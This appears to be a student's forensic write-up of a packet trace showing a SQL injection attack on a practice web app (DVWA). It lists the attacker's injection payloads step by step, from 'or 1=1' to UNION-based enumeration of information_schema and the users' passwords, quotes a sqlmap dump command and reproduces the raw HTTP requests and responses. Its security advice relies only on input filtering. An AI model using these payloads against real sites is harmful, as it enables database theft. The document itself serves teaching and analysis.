@@ -1,0 +1,131 @@
+• What kind of data is contained in the trace file?
+This PCAP file contains packet data from one peer to another, e.g., source and destination addresses, sequence number (Seq), 
+window size (Win), acknowledgement number (Ack).
+We can derive useful information from these data.
+For example, the first three frames demonstrate a three-way-handshake.
+
+• The trace file contains an attack. What is the target?
+This attack is SQL injection. 
+Its aim is to gain credentials from the server such as passwords.
+
+• Please give an overall sketch of the attacker’s actions.
+Step 1: The attacker submitted different ids to figure out this table's structure:
+no data returned with id=0 and data found with id=1.
+	GET /vulnerabilities/sqli/?id=0&Submit=Submit HTTP/1.1\r\n
+
+	GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\r\n
+	ID: 1<br>First name: admin<br>Surname: admin
+(The meaning of id=X is similar to "select * from TABLE where id=X".)
+From "First name: admin" and "Surname: admin", we know there are two columns ("First name" and "Surname") and "admin" is one of the users.
+
+Step 2: The attacker used "id=1 or 1=1" to extract all users from the server:
+	First name: admin<br>Surname: admin
+	First name: Gordon<br>Surname: Brown
+	First name: Hack<br>Surname: Me
+	First name: Pablo<b
+
+Step 3: "id=1 or 1=1 union select 1" is to guess how many columns the original table has. Because "union" is included and "select 1" means the generated table has only one column, if the number of columns of the original table is NOT the same as the generated one, the server will return error messages.
+In this case, it is "The used SELECT statements have a different number of columns".
+That is, the original table has more than one column.
+
+Step 4: "id=1 or 1=1 union select 1,2" is similar to the above one but this time the attacker guessed there are two columns of the original table. The received message is:
+	First name: admin<br>Surname: admin
+	First name: Gordon<br>Surname: Brown
+	First name: Hack<br>Surnam"
+This indicates that the original table has two columns.
+
+Step 5: The attacker employed "id=1 or 1=1 union select null, concat(first_name,0x3a,pass) from users" to guess the coloumn names ("first_name" and "pass") of table "users". 
+The function of "concat" is to concatenate strings together. For example, if first_name="Jordan" and pass="23", the result of concat("Jordan",0x3a,"23") is "Jordan:23" (0x3a equal to ":").
+But, the server returned "Unknown column 'pass' in 'field list'". That is, the attacker needs to have another method due to the wrong guess of column names of table "users".
+
+Step 6: "id=1 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns" is to explore the server's tables and corresponding columns. The reponse of table "users" is:
+	<br>First name: <br>Surname: users\n          
+    user_id
+    <br>First name: <br>Surname: users\n
+    first_name
+    <br>First name: <br>Surname: users\n
+    last_name
+    <br>First name: <br>Surname: users\n
+    user
+    <br>First name: <br>Surname: users\n
+    password
+    <br>First name: <br>Surname: users\n
+    avatar</pre>
+	(0x0a equal to "\n")
+From this, we know table "users" has columns which are "user_id", "first_name", "last_name", "user", "password" and "avatar".
+
+Step 7: "id=1 or 1=1 union select null, concat(first_name,0x3a,password) from users" tried to exploit the server's private data but failed because the response doesn't contain any user's password but "First name: admin<br>Surname: admin" which is merely normal data.
+
+
+• What is the exploit vector, i.e. what weakness is targeted by the attack?
+The server doesn't implement security measures of SQL. Due to this, attackers are able to inject abnormal SQL commands to steal servers' credentials and thus use them to intercept more useful information.
+
+• By analyzing the trace file, would you say this attack ultimately compromises the victim system or would you expect further steps?
+We think it didn't finish its job because no more intrusion is deployed. Once attackers get credentials, they should try to log in to the server and retrieve confidentials such as business secrets to leverage the benefit.
+
+• Was the attack successful?
+We think it failed because it didn't get any user's password.
+
+• Can you find information about related attack methods on the Internet?
+We found "sqlmap.py" is well-known and used to exploit servers' database.
+For example, "python sqlmap.py -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit= Submit#" --cookie="PHPSESSID=ce0aa7922720f3190bf9bbff7f24c434;security=low" --forms -D dvwa -T users --columns --dump" can dump column information of table "users". (http://www.admin-magazine.com/Articles/Uncovering-SQL-Injections)
+	Table: users
+	[6 columns]
+	+------------+-------------+
+	| Column     | Type        |
+	+------------+-------------+
+	| avatar     | varchar(70) |
+	| first_name | varchar(15) |
+	| last_name  | varchar(15) |
+	| password   | varchar(32) |
+	| user       | varchar(15) |
+	| user_id    | int(6)      |
+	+------------+-------------+
+
+
+• How can you secure a system against these kind of attacks?
+We have to implement "string inspection mechanism" to check if users input too many irrelevant characters or SQL-related commands.
+Once filtering out those suspicious data, we are able to secure servers with a less intrusion rate.
+
+---------------------------------
+GET /vulnerabilities/sqli/?id=0&Submit=Submit HTTP/1.1\r\n
+
+
+GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\r\n
+ID: 1<br>First name: admin<br>Surname: admin
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1&Submit=Submit HTTP/1.1\r\n
+ID: 1 or 1=1<br>First name: admin<br>Surname: admin
+<br>First name: Gordon<br>Surname: Brown
+<br>First name: Hack<br>Surname: Me
+<br>First name: Pablo<b
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1+union+select+1&Submit=Submit HTTP/1.1\r\n
+ID: 1 or 1=1 union select 1
+The used SELECT statements have a different number of columns
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1+union+select+1%2C2&Submit=Submit HTTP/1.1\r\n
+ID: 1 or 1=1 union select 1,2<br>First name: admin<br>Surname: admin</pre><pre>ID: 1 or 1=1 union select 1,2<br>First name: Gordon<br>Surname: Brown</pre><pre>ID: 1 or 1=1 union select 1,2<br>First name: Hack<br>Surnam
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1+union+select+null%2C+concat%28first_name%2C0x3a%2Cpass%29+from+users&Submit=Submit HTTP/1.1\r\n
+ID: 1 or 1=1 union select null, concat(first_name,0x3a,pass) from users
+Unknown column 'pass' in 'field list'             (:)
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn_name%29+from+information_schema.columns&Submit=Submit HTTP/1.1
+ID: 1 or 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns
+	<br>First name: <br>Surname: users\n          (\n)
+    user_id
+    <br>First name: <br>Surname: users\n
+    first_name
+    <br>First name: <br>Surname: users\n
+    last_name
+    <br>First name: <br>Surname: users\n
+    user
+    <br>First name: <br>Surname: users\n
+    password
+    <br>First name: <br>Surname: users\n
+    avatar</pre>
+
+GET /vulnerabilities/sqli/?id=1+or+1%3D1+union+select+null%2C+concat%28first_name%2C0x3a%2Cpassword%29+from+users&Submit=Submit HTTP/1.1 
+ID: 1 or 1=1 union select null, concat(first_name,0x3a,password) from users
+First name: admin<br>Surname: admin
